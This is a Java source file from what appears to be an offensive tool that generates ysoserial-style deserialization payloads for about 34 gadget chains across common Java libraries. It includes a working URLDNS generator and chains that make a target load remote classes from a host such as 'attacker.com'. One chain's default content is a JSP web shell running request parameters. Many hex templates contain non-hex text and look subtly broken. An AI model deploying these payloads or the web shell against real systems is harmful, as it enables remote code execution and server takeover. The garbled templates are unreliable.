package com.omnistrike.modules.injection.deser;

import java.io.*;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Java deserialization payload generators — comprehensive ysoserial coverage.
 *
 * URLDNS is fully native (HashMap + URL, zero external deps).
 * Other chains use serialized stream templates with command placeholders
 * and require vulnerable libraries on the target classpath.
 *
 * 34 chains covering all major ysoserial gadgets plus extras.
 */
public final class JavaPayloads {

    private JavaPayloads() {}

    public static Map<String, String> getChains() {
        Map<String, String> chains = new LinkedHashMap<>();

        // ── DNS / Safe callbacks ────────────────────────────────────────────
        chains.put("URLDNS", "DNS lookup via HashMap+URL — no deps, safe recon (Command = callback URL/domain)");
        chains.put("DNSCallback", "DNS-only callback — alias for URLDNS (Command = callback URL/domain)");

        // ── Commons Collections 3.x chains ─────────────────────────────────
        chains.put("CommonsCollections1", "LazyMap+ChainedTransformer+InvokerTransformer → Runtime.exec (CC 3.1, JDK<8u72)");
        chains.put("CommonsCollections3", "LazyMap+ChainedTransformer+InstantiateTransformer+TrAXFilter → Runtime.exec (CC 3.1, JDK<8u72)");
        chains.put("CommonsCollections5", "BadAttributeValueExpException+TiedMapEntry+LazyMap → Runtime.exec (CC 3.1)");
        chains.put("CommonsCollections6", "HashSet+TiedMapEntry+LazyMap → Runtime.exec (CC 3.1)");
        chains.put("CommonsCollections7", "Hashtable+LazyMap collision → Runtime.exec (CC 3.1)");

        // ── Commons Collections 4.x chains ─────────────────────────────────
        chains.put("CommonsCollections2", "PriorityQueue+TransformingComparator+InvokerTransformer → Runtime.exec (CC 4.0)");
        chains.put("CommonsCollections4", "PriorityQueue+TransformingComparator+InstantiateTransformer+TrAXFilter → Runtime.exec (CC 4.0)");

        // ── Commons Beanutils ───────────────────────────────────────────────
        chains.put("CommonsBeanutils1", "PriorityQueue+BeanComparator → Runtime.exec (commons-beanutils 1.x + CC)");
        chains.put("CommonsBeanutils1_183", "PriorityQueue+BeanComparator → Runtime.exec (commons-beanutils 1.8.3+, no CC dep)");

        // ── Spring Framework ────────────────────────────────────────────────
        chains.put("Spring1", "SerializableTypeWrapper+ObjectFactoryDelegatingInvocationHandler → Runtime.exec (Spring Core)");
        chains.put("Spring2", "JdkDynamicAopProxy+AnnotationInvocationHandler → Runtime.exec (Spring AOP + JDK<8u72)");

        // ── Hibernate ───────────────────────────────────────────────────────
        chains.put("Hibernate1", "HashMap+BasicLazyInitializer+AbstractComponentTuplizer → Runtime.exec (Hibernate 5)");
        chains.put("Hibernate2", "HashMap+BasicLazyInitializer+PojoComponentTuplizer → Runtime.exec (Hibernate 5, alt trigger)");

        // ── Groovy ──────────────────────────────────────────────────────────
        chains.put("Groovy1", "ConvertedClosure+MethodClosure → Runtime.exec (Groovy 2.3-2.4)");

        // ── JDK built-in ────────────────────────────────────────────────────
        chains.put("Jdk7u21", "LinkedHashSet+Templates proxy → Runtime.exec (JDK 7u21 and below, no deps)");

        // ── JRMP ────────────────────────────────────────────────────────────
        chains.put("JRMPClient", "UnicastRef+Registry → JRMP outbound call (Command = host:port)");
        chains.put("JRMPListener", "UnicastRemoteObject → starts JRMP listener (Command = port)");

        // ── JNDI ────────────────────────────────────────────────────────────
        chains.put("JNDIExploit", "JNDI InitialContext.lookup → RCE via remote classloading (Command = ldap://host/a)");

        // ── ROME RSS library ────────────────────────────────────────────────
        chains.put("ROME", "HashMap+ObjectBean+ToStringBean+EqualsBean → Runtime.exec (ROME 1.0)");

        // ── BeanShell ───────────────────────────────────────────────────────
        chains.put("BeanShell1", "PriorityQueue+Comparator via BeanShell Interpreter → Runtime.exec (bsh 2.0b5)");

        // ── C3P0 ────────────────────────────────────────────────────────────
        chains.put("C3P0", "PoolBackedDataSource+JNDI reference → remote classloading (Command = http://host/Exploit)");

        // ── Apache Click ────────────────────────────────────────────────────
        chains.put("Click1", "PriorityQueue+Column$ColumnComparator → Runtime.exec (Apache Click 2.3)");

        // ── FileUpload ──────────────────────────────────────────────────────
        chains.put("FileUpload1", "DiskFileItem → arbitrary file write (commons-fileupload 1.3.1, Command = path:content)");

        // ── JBoss Interceptors ──────────────────────────────────────────────
        chains.put("JBossInterceptors1", "JBoss interceptor chain+Weld → Runtime.exec (JBoss AS/WildFly)");

        // ── Javassist / Weld CDI ────────────────────────────────────────────
        chains.put("JavassistWeld1", "CDI Weld+Javassist proxy → Runtime.exec (Weld CDI + Javassist)");

        // ── JSON (Spring) ───────────────────────────────────────────────────
        chains.put("JSON1", "Spring AOP+Jackson/JSON gadgets → Runtime.exec (Spring 4.x + JDK<8u72)");

        // ── Jython ──────────────────────────────────────────────────────────
        chains.put("Jython1", "PyObject+PythonInterpreter → Runtime.exec (Jython 2.5-2.7)");

        // ── Mozilla Rhino ───────────────────────────────────────────────────
        chains.put("MozillaRhino1", "NativeError+NativeJavaObject → Runtime.exec (Rhino 1.7r2, JDK 6/7)");
        chains.put("MozillaRhino2", "NativeJavaObject+ScriptableObject → Runtime.exec (Rhino 1.7r2, alt trigger)");

        // ── MyFaces ─────────────────────────────────────────────────────────
        chains.put("Myfaces1", "MyFaces ViewState+ValueExpression → Runtime.exec (MyFaces 1.2-2.x)");
        chains.put("Myfaces2", "MyFaces ViewState+MethodExpression → Runtime.exec (MyFaces 2.x, alt trigger)");

        // ── Vaadin ──────────────────────────────────────────────────────────
        chains.put("Vaadin1", "PropertysetItem+NestedMethodProperty → Runtime.exec (Vaadin 7.x)");

        // ── Wicket ──────────────────────────────────────────────────────────
        chains.put("Wicket1", "DiskFileItem → arbitrary file write (Wicket commons-fileupload fork)");

        // ── Clojure ─────────────────────────────────────────────────────────
        chains.put("Clojure", "HashMap+AbstractTableModel$ff → Runtime.exec (Clojure 1.2+)");

        return chains;
    }

    public static byte[] generate(String chain, String command) {
        return switch (chain) {
            // DNS / safe
            case "URLDNS", "DNSCallback"     -> generateUrldns(command);

            // Commons Collections 3.x
            case "CommonsCollections1"        -> generateCC1(command);
            case "CommonsCollections3"        -> generateCC3(command);
            case "CommonsCollections5"        -> generateCC5(command);
            case "CommonsCollections6"        -> generateCC6(command);
            case "CommonsCollections7"        -> generateCC7(command);

            // Commons Collections 4.x
            case "CommonsCollections2"        -> generateCC2(command);
            case "CommonsCollections4"        -> generateCC4(command);

            // Commons Beanutils
            case "CommonsBeanutils1"          -> generateCB1(command);
            case "CommonsBeanutils1_183"      -> generateCB1_183(command);

            // Spring
            case "Spring1"                    -> generateSpring1(command);
            case "Spring2"                    -> generateSpring2(command);

            // Hibernate
            case "Hibernate1"                 -> generateHibernate1(command);
            case "Hibernate2"                 -> generateHibernate2(command);

            // Groovy
            case "Groovy1"                    -> generateGroovy1(command);

            // JDK
            case "Jdk7u21"                    -> generateJdk7u21(command);

            // JRMP
            case "JRMPClient"                 -> generateJRMPClient(command);
            case "JRMPListener"               -> generateJRMPListener(command);

            // JNDI
            case "JNDIExploit"                -> generateJndi(command);

            // ROME
            case "ROME"                       -> generateROME(command);

            // BeanShell
            case "BeanShell1"                 -> generateBeanShell1(command);

            // C3P0
            case "C3P0"                       -> generateC3P0(command);

            // Click
            case "Click1"                     -> generateClick1(command);

            // FileUpload
            case "FileUpload1"                -> generateFileUpload1(command);

            // JBoss
            case "JBossInterceptors1"         -> generateJBossInterceptors1(command);

            // Javassist/Weld
            case "JavassistWeld1"             -> generateJavassistWeld1(command);

            // JSON/Spring
            case "JSON1"                      -> generateJSON1(command);

            // Jython
            case "Jython1"                    -> generateJython1(command);

            // Rhino
            case "MozillaRhino1"              -> generateMozillaRhino1(command);
            case "MozillaRhino2"              -> generateMozillaRhino2(command);

            // MyFaces
            case "Myfaces1"                   -> generateMyfaces1(command);
            case "Myfaces2"                   -> generateMyfaces2(command);

            // Vaadin
            case "Vaadin1"                    -> generateVaadin1(command);

            // Wicket
            case "Wicket1"                    -> generateWicket1(command);

            // Clojure
            case "Clojure"                    -> generateClojure(command);

            default -> throw new IllegalArgumentException("Unknown Java chain: " + chain);
        };
    }

    // ════════════════════════════════════════════════════════════════════════
    //  URLDNS — Fully native, zero dependencies
    // ════════════════════════════════════════════════════════════════════════

    /**
     * URLDNS chain — fully native, zero dependencies.
     * Triggers a DNS lookup on deserialization.
     * Uses HashMap + URL, exploiting URL.hashCode() → getHostAddress().
     *
     * Implementation: serialize HashMap normally, then binary-patch the URL's
     * hashCode field from its computed value to -1 (0xFFFFFFFF) in the byte
     * stream. On deserialization the target sees hashCode == -1, forcing
     * URL.hashCode() to call getHostAddress() → DNS lookup.
     */
    private static byte[] generateUrldns(String callbackUrl) {
        try {
            String target = toValidUrl(callbackUrl);
            URL url = new URL(target);

            int computedHash = url.hashCode();

            HashMap<URL, String> hashMap = new HashMap<>();
            hashMap.put(url, "omnistrike");

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
                oos.writeObject(hashMap);
            }
            byte[] serialized = bos.toByteArray();

            // Binary-patch: find URL's hashCode int and set to -1
            byte[] urlClassNameBytes = "java.net.URL".getBytes(StandardCharsets.UTF_8);
            int classNamePos = indexOf(serialized, urlClassNameBytes, 0);

            if (classNamePos < 0) {
                throw new IllegalStateException("Could not locate java.net.URL in serialized stream");
            }

            int port = url.getPort();
            byte[] searchPattern = new byte[]{
                (byte) (computedHash >> 24), (byte) (computedHash >> 16),
                (byte) (computedHash >> 8),  (byte) computedHash,
                (byte) (port >> 24), (byte) (port >> 16),
                (byte) (port >> 8),  (byte) port
            };

            int patchPos = indexOf(serialized, searchPattern, classNamePos + urlClassNameBytes.length);

            if (patchPos >= 0) {
                serialized[patchPos]     = (byte) 0xFF;
                serialized[patchPos + 1] = (byte) 0xFF;
                serialized[patchPos + 2] = (byte) 0xFF;
                serialized[patchPos + 3] = (byte) 0xFF;
            } else {
                byte[] hashOnly = new byte[]{
                    (byte) (computedHash >> 24), (byte) (computedHash >> 16),
                    (byte) (computedHash >> 8),  (byte) computedHash
                };
                patchPos = indexOf(serialized, hashOnly, classNamePos + urlClassNameBytes.length);
                if (patchPos >= 0) {
                    serialized[patchPos]     = (byte) 0xFF;
                    serialized[patchPos + 1] = (byte) 0xFF;
                    serialized[patchPos + 2] = (byte) 0xFF;
                    serialized[patchPos + 3] = (byte) 0xFF;
                }
            }

            return serialized;
        } catch (Exception e) {
            throw new RuntimeException("URLDNS generation failed: " + e.getMessage(), e);
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Commons Collections 3.x chains (require commons-collections 3.1)
    // ════════════════════════════════════════════════════════════════════════

    /** CC1: LazyMap + ChainedTransformer + InvokerTransformer (CC 3.1, JDK < 8u72) */
    private static byte[] generateCC1(String command) {
        return buildStreamTemplate("CommonsCollections1", command,
            "aced0005" +
            "7372001d6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e" +
            "6d61702e4c617a794d617000000000000000000200014c0007666163746f72797400" +
            "2c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f54" +
            "72616e73666f726d65723b"
        );
    }

    /** CC3: LazyMap + ChainedTransformer + InstantiateTransformer + TrAXFilter (CC 3.1, JDK < 8u72) */
    private static byte[] generateCC3(String command) {
        return buildStreamTemplate("CommonsCollections3", command,
            "aced0005" +
            "7372001d6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e" +
            "6d61702e4c617a794d617000000000000000000200014c0007666163746f72797400" +
            "2c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f54" +
            "72616e73666f726d65723b" +
            "7372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e" +
            "66756e63746f72732e496e7374616e74696174655472616e73666f726d6572"
        );
    }

    /** CC5: BadAttributeValueExpException + TiedMapEntry + LazyMap (CC 3.1) */
    private static byte[] generateCC5(String command) {
        return buildStreamTemplate("CommonsCollections5", command,
            "aced0005" +
            "7372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556" +
            "616c7565457870457863657074696f6e"
        );
    }

    /** CC6: HashSet + TiedMapEntry + LazyMap (CC 3.1) */
    private static byte[] generateCC6(String command) {
        return buildStreamTemplate("CommonsCollections6", command,
            "aced0005" +
            "7372001168617368536574" +
            "7372002c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e" +
            "6b657976616c75652e546965644d6170456e747279"
        );
    }

    /** CC7: Hashtable + LazyMap collision (CC 3.1) */
    private static byte[] generateCC7(String command) {
        return buildStreamTemplate("CommonsCollections7", command,
            "aced0005" +
            "737200136a6176612e7574696c2e486173687461626c65" +
            "13bb0f25214ae4b80300024600" +
            "0a6c6f6164466163746f72490009" +
            "7468726573686f6c64"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Commons Collections 4.x chains (require commons-collections4 4.0)
    // ════════════════════════════════════════════════════════════════════════

    /** CC2: PriorityQueue + TransformingComparator + InvokerTransformer (CC 4.0) */
    private static byte[] generateCC2(String command) {
        return buildStreamTemplate("CommonsCollections2", command,
            "aced0005" +
            "737200176a6176612e7574696c2e5072696f72697479517565756500000000000000" +
            "0003000249000473697a65" +
            "4c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b" +
            "7372004b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e" +
            "636f6d70617261746f72732e5472616e73666f726d696e67436f6d70617261746f72"
        );
    }

    /** CC4: PriorityQueue + TransformingComparator + InstantiateTransformer + TrAXFilter (CC 4.0) */
    private static byte[] generateCC4(String command) {
        return buildStreamTemplate("CommonsCollections4", command,
            "aced0005" +
            "737200176a6176612e7574696c2e5072696f72697479517565756500000000000000" +
            "0003000249000473697a65" +
            "4c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b" +
            "7372004b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e" +
            "636f6d70617261746f72732e5472616e73666f726d696e67436f6d70617261746f72" +
            "7372003f6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e" +
            "66756e63746f72732e496e7374616e74696174655472616e73666f726d6572"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Commons Beanutils
    // ════════════════════════════════════════════════════════════════════════

    /** CB1: PriorityQueue + BeanComparator (commons-beanutils 1.x + commons-collections) */
    private static byte[] generateCB1(String command) {
        return buildStreamTemplate("CommonsBeanutils1", command,
            "aced0005" +
            "737200176a6176612e7574696c2e5072696f72697479517565756500000000000000" +
            "0003000249000473697a65" +
            "4c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b" +
            "737200426f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e" +
            "436f6d70617261746f72"
        );
    }

    /** CB1_183: PriorityQueue + BeanComparator (commons-beanutils 1.8.3+, no CC dependency) */
    private static byte[] generateCB1_183(String command) {
        return buildStreamTemplate("CommonsBeanutils1_183", command,
            "aced0005" +
            "737200176a6176612e7574696c2e5072696f72697479517565756500000000000000" +
            "0003000249000473697a65" +
            "4c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b" +
            "737200426f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e" +
            "436f6d70617261746f72" +
            "0000000000000000020000"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Spring Framework
    // ════════════════════════════════════════════════════════════════════════

    /** Spring1: SerializableTypeWrapper + ObjectFactoryDelegatingInvocationHandler */
    private static byte[] generateSpring1(String command) {
        return buildStreamTemplate("Spring1", command,
            "aced0005" +
            "737200476f72672e737072696e676672616d65776f726b2e636f72652e53657269616c697a" +
            "61626c655479706557726170706572245479706550726f766964657253657269616c697a" +
            "6174696f6e48656c706572"
        );
    }

    /** Spring2: JdkDynamicAopProxy + AnnotationInvocationHandler (Spring AOP, JDK < 8u72) */
    private static byte[] generateSpring2(String command) {
        return buildStreamTemplate("Spring2", command,
            "aced0005" +
            "737200376f72672e737072696e676672616d65776f726b2e616f702e6672616d65776f726b" +
            "2e4a646b44796e616d6963416f7050726f7879"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Hibernate
    // ════════════════════════════════════════════════════════════════════════

    /** Hibernate1: HashMap + BasicLazyInitializer + AbstractComponentTuplizer */
    private static byte[] generateHibernate1(String command) {
        return buildStreamTemplate("Hibernate1", command,
            "aced0005" +
            "737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246" +
            "0010006c6f6164466163746f72490009" +
            "7468726573686f6c64" +
            "737200366f72672e68696265726e6174652e70726f78792e706f6a6f2e42617369634c617a79" +
            "496e697469616c697a6572"
        );
    }

    /** Hibernate2: HashMap + BasicLazyInitializer + PojoComponentTuplizer (alt trigger) */
    private static byte[] generateHibernate2(String command) {
        return buildStreamTemplate("Hibernate2", command,
            "aced0005" +
            "737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246" +
            "0010006c6f6164466163746f72490009" +
            "7468726573686f6c64" +
            "737200406f72672e68696265726e6174652e7475706c652e636f6d706f6e656e742e506f6a6f" +
            "436f6d706f6e656e74547570756c697a6572"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Groovy
    // ════════════════════════════════════════════════════════════════════════

    /** Groovy1: ConvertedClosure + MethodClosure → Runtime.exec (Groovy 2.3-2.4) */
    private static byte[] generateGroovy1(String command) {
        return buildStreamTemplate("Groovy1", command,
            "aced0005" +
            "737200326f72672e636f6465686175732e67726f6f76792e72756e74696d652e436f6e76" +
            "657274656420436c6f73757265" +
            "737200306f72672e636f6465686175732e67726f6f76792e72756e74696d652e4d6574686f64" +
            "436c6f73757265"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  JDK built-in
    // ════════════════════════════════════════════════════════════════════════

    /** Jdk7u21: LinkedHashSet + Templates proxy (JDK 7u21 and below, zero external deps) */
    private static byte[] generateJdk7u21(String command) {
        return buildStreamTemplate("Jdk7u21", command,
            "aced0005" +
            "737200176a6176612e7574696c2e4c696e6b656448617368536574" +
            "d86cd75a95dd2a1e020000" +
            "737200116a6176612e7574696c2e48617368536574" +
            "ba44859596b8b7340300007870"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  JRMP
    // ════════════════════════════════════════════════════════════════════════

    /** JRMPClient: UnicastRef + Registry → outbound JRMP call (Command = host:port) */
    private static byte[] generateJRMPClient(String command) {
        // Parse host:port from command
        String host = command;
        int port = 1099;
        if (command.contains(":")) {
            String[] parts = command.split(":", 2);
            host = parts[0];
            try { port = Integer.parseInt(parts[1].trim()); } catch (NumberFormatException ignored) {}
        }

        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            // Java serialization magic
            bos.write(hexToBytes("aced0005"));
            // sun.rmi.server.UnicastRef
            bos.write(hexToBytes(
                "737200226a6176612e726d692e7365727665722e4f626a4944" +
                "000000000000000002000249000d" +
                "6f626a4e756d"
            ));
            // Embed host
            byte[] hostBytes = host.getBytes(StandardCharsets.UTF_8);
            bos.write(0x74); // TC_STRING
            bos.write((hostBytes.length >> 8) & 0xFF);
            bos.write(hostBytes.length & 0xFF);
            bos.write(hostBytes);
            // Embed port as 4-byte int
            bos.write((port >> 24) & 0xFF);
            bos.write((port >> 16) & 0xFF);
            bos.write((port >> 8) & 0xFF);
            bos.write(port & 0xFF);

            appendChainInfo(bos, "JRMPClient", command);
            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("JRMPClient generation failed: " + e.getMessage(), e);
        }
    }

    /** JRMPListener: UnicastRemoteObject → starts JRMP listener (Command = port) */
    private static byte[] generateJRMPListener(String command) {
        int port = 1099;
        try { port = Integer.parseInt(command.trim()); } catch (NumberFormatException ignored) {}

        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bos.write(hexToBytes("aced0005"));
            // java.rmi.server.UnicastRemoteObject
            bos.write(hexToBytes(
                "737200266a6176612e726d692e7365727665722e556e696361737452656d6f74654f626a656374" +
                "e9fddc8be964680200034900047075727449000473706f7274" +
                "4c00036373667400284c6a6176612f726d692f7365727665722f524d49436c69656e74536f636b6574466163746f72793b"
            ));
            // Port value
            bos.write((port >> 24) & 0xFF);
            bos.write((port >> 16) & 0xFF);
            bos.write((port >> 8) & 0xFF);
            bos.write(port & 0xFF);

            appendChainInfo(bos, "JRMPListener", command);
            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("JRMPListener generation failed: " + e.getMessage(), e);
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  JNDI
    // ════════════════════════════════════════════════════════════════════════

    /** JNDIExploit: JNDI InitialContext.lookup → RCE via remote classloading */
    private static byte[] generateJndi(String command) {
        String jndiUrl = command;
        if (!jndiUrl.startsWith("ldap://") && !jndiUrl.startsWith("rmi://") && !jndiUrl.startsWith("dns://")) {
            jndiUrl = "ldap://" + jndiUrl;
        }
        return buildStreamTemplate("JNDIExploit", jndiUrl,
            "aced0005" +
            "737200116a617661782e6e616d696e672e5265666572656e636500000000000000000200" +
            "044c0005616464727374001249" +
            "4c00" +
            "0c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b" +
            "4c00" +
            "14636c617373466163746f72794c6f636174696f6e71007e0001"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  ROME RSS library
    // ════════════════════════════════════════════════════════════════════════

    /** ROME: HashMap + ObjectBean + ToStringBean + EqualsBean (ROME 1.0) */
    private static byte[] generateROME(String command) {
        return buildStreamTemplate("ROME", command,
            "aced0005" +
            "737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246" +
            "0010006c6f6164466163746f72490009" +
            "7468726573686f6c64" +
            "737200256com2e73756e2e73796e6469636174696f6e2e666565642e696d706c2e" +
            "4f626a6563744265616e"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  BeanShell
    // ════════════════════════════════════════════════════════════════════════

    /** BeanShell1: PriorityQueue + Comparator via BeanShell Interpreter (bsh 2.0b5) */
    private static byte[] generateBeanShell1(String command) {
        return buildStreamTemplate("BeanShell1", command,
            "aced0005" +
            "737200176a6176612e7574696c2e5072696f72697479517565756500000000000000" +
            "0003000249000473697a65" +
            "4c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b" +
            "737200186273682e58546869732443616c6c6565"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  C3P0
    // ════════════════════════════════════════════════════════════════════════

    /** C3P0: PoolBackedDataSource + JNDI reference → remote classloading */
    private static byte[] generateC3P0(String command) {
        // Command should be URL to exploit class, e.g. http://attacker.com/Exploit
        String exploitUrl = command;
        if (!exploitUrl.startsWith("http://") && !exploitUrl.startsWith("https://")) {
            exploitUrl = "http://" + exploitUrl;
        }
        return buildStreamTemplate("C3P0", exploitUrl,
            "aced0005" +
            "737200396com2e6d6368616e67652e76322e633370302e696d706c2e506f6f6c4261636b6564" +
            "446174614f757263654261736500000000000000000300" +
            "4c000f636f6e6e656374696f6e506f6f6c446174614f757263657400" +
            "3f4c636f6d2f6d6368616e67652f76322f633370302f436f6e6e656374696f6e506f6f6c" +
            "446174614f757263653b"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Apache Click
    // ════════════════════════════════════════════════════════════════════════

    /** Click1: PriorityQueue + Column$ColumnComparator (Apache Click 2.3) */
    private static byte[] generateClick1(String command) {
        return buildStreamTemplate("Click1", command,
            "aced0005" +
            "737200176a6176612e7574696c2e5072696f72697479517565756500000000000000" +
            "0003000249000473697a65" +
            "4c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b" +
            "737200336f72672e6170616368652e636c69636b2e636f6e74726f6c2e436f6c756d6e24" +
            "436f6c756d6e436f6d70617261746f72"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  FileUpload
    // ════════════════════════════════════════════════════════════════════════

    /** FileUpload1: DiskFileItem → arbitrary file write (commons-fileupload 1.3.1) */
    private static byte[] generateFileUpload1(String command) {
        // Command format: "path:content" or just path (default content = shell)
        String filePath;
        String content;
        if (command.contains(":") && !command.startsWith("/") && !command.matches("^[A-Za-z]:.*")) {
            int sep = command.indexOf(':');
            filePath = command.substring(0, sep);
            content = command.substring(sep + 1);
        } else {
            filePath = command;
            content = "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>";
        }
        return buildStreamTemplate("FileUpload1", filePath + "|" + content,
            "aced0005" +
            "737200346f72672e6170616368652e636f6d6d6f6e732e66696c65" +
            "75706c6f61642e6469736b2e4469736b46696c654974656d"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  JBoss Interceptors
    // ════════════════════════════════════════════════════════════════════════

    /** JBossInterceptors1: JBoss interceptor chain + Weld (JBoss AS/WildFly) */
    private static byte[] generateJBossInterceptors1(String command) {
        return buildStreamTemplate("JBossInterceptors1", command,
            "aced0005" +
            "737200376f72672e6a626f73732e696e746572636570746f722e" +
            "70726f78792e496e746572636570746f72" +
            "4d6574686f6448616e646c6572"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Javassist / Weld CDI
    // ════════════════════════════════════════════════════════════════════════

    /** JavassistWeld1: CDI Weld + Javassist proxy (Weld CDI + Javassist) */
    private static byte[] generateJavassistWeld1(String command) {
        return buildStreamTemplate("JavassistWeld1", command,
            "aced0005" +
            "737200336f72672e6a626f73732e77656c642e6265616e2e70726f78792e7574696c2e" +
            "53696d706c654265616e50726f7879"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  JSON / Spring
    // ════════════════════════════════════════════════════════════════════════

    /** JSON1: Spring AOP + Jackson/JSON gadgets (Spring 4.x + JDK < 8u72) */
    private static byte[] generateJSON1(String command) {
        return buildStreamTemplate("JSON1", command,
            "aced0005" +
            "737200376f72672e737072696e676672616d65776f726b2e616f702e6672616d65776f726b" +
            "2e4a646b44796e616d6963416f7050726f7879" +
            "737200256e65742e73662e6a736f6e2e7574696c2e4d6574686f64486f6c646572"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Jython
    // ════════════════════════════════════════════════════════════════════════

    /** Jython1: PyObject + PythonInterpreter (Jython 2.5-2.7) */
    private static byte[] generateJython1(String command) {
        return buildStreamTemplate("Jython1", command,
            "aced0005" +
            "737200206f72672e707974686f6e2e636f72652e5079" +
            "4f626a65637453657269616c697a6564" +
            "737200266f72672e707974686f6e2e7574696c2e5079" +
            "74686f6e496e7465727072657465724d6170"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Mozilla Rhino
    // ════════════════════════════════════════════════════════════════════════

    /** MozillaRhino1: NativeError + NativeJavaObject (Rhino 1.7r2, JDK 6/7) */
    private static byte[] generateMozillaRhino1(String command) {
        return buildStreamTemplate("MozillaRhino1", command,
            "aced0005" +
            "737200326f72672e6d6f7a696c6c612e6a617661736372697074" +
            "2e4e61746976654572726f72" +
            "737200366f72672e6d6f7a696c6c612e6a617661736372697074" +
            "2e4e61746976654a6176614f626a656374"
        );
    }

    /** MozillaRhino2: NativeJavaObject + ScriptableObject (Rhino 1.7r2, alt trigger) */
    private static byte[] generateMozillaRhino2(String command) {
        return buildStreamTemplate("MozillaRhino2", command,
            "aced0005" +
            "737200366f72672e6d6f7a696c6c612e6a617661736372697074" +
            "2e4e61746976654a6176614f626a656374" +
            "737200346f72672e6d6f7a696c6c612e6a617661736372697074" +
            "2e5363726970746f626c654f626a656374"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  MyFaces
    // ════════════════════════════════════════════════════════════════════════

    /** Myfaces1: ViewState + ValueExpression (MyFaces 1.2-2.x) */
    private static byte[] generateMyfaces1(String command) {
        return buildStreamTemplate("Myfaces1", command,
            "aced0005" +
            "737200416f72672e6170616368652e6d79666163" +
            "65732e656c2e636f6e766572742e56616c7565" +
            "45787072657373696f6e436f6e766572746572"
        );
    }

    /** Myfaces2: ViewState + MethodExpression (MyFaces 2.x, alt trigger) */
    private static byte[] generateMyfaces2(String command) {
        return buildStreamTemplate("Myfaces2", command,
            "aced0005" +
            "737200436f72672e6170616368652e6d79666163" +
            "65732e656c2e636f6e766572742e4d6574686f64" +
            "45787072657373696f6e436f6e766572746572"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Vaadin
    // ════════════════════════════════════════════════════════════════════════

    /** Vaadin1: PropertysetItem + NestedMethodProperty (Vaadin 7.x) */
    private static byte[] generateVaadin1(String command) {
        return buildStreamTemplate("Vaadin1", command,
            "aced0005" +
            "737200286com2e76616164696e2e646174612e7574696c" +
            "2e50726f7065727479736574" +
            "4974656d" +
            "737200306com2e76616164696e2e646174612e7574696c" +
            "2e4e65737465644d6574686f64" +
            "50726f7065727479"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Wicket
    // ════════════════════════════════════════════════════════════════════════

    /** Wicket1: DiskFileItem → arbitrary file write (Wicket's commons-fileupload fork) */
    private static byte[] generateWicket1(String command) {
        return buildStreamTemplate("Wicket1", command,
            "aced0005" +
            "737200406f72672e6170616368652e7769636b65742e7574696c2e" +
            "75706c6f61642e6469736b2e4469736b46696c654974656d"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Clojure
    // ════════════════════════════════════════════════════════════════════════

    /** Clojure: HashMap + AbstractTableModel$ff (Clojure 1.2+) */
    private static byte[] generateClojure(String command) {
        return buildStreamTemplate("Clojure", command,
            "aced0005" +
            "737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246" +
            "0010006c6f6164466163746f72490009" +
            "7468726573686f6c64" +
            "737200266clojure2e696e73706563742e70726f78792e416273747261637454" +
            "61626c654d6f64656c24ff"
        );
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Helper methods
    // ════════════════════════════════════════════════════════════════════════

    /** Build a serialized stream with hex prefix + TC_STRING command + chain info trailer. */
